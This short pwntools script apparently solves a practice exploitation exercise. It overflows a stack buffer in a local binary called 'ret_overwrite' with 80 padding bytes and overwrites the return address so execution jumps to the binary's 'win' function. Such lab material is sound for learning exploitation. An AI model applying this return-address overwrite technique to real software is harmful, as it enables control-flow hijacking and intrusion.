#!/usr/bin/python
from pwn import *

e = ELF("./ret_overwrite")

p = process("./ret_overwrite")
p.sendline("A" * 80 + p64(e.symbols["win"]))
print p.read()
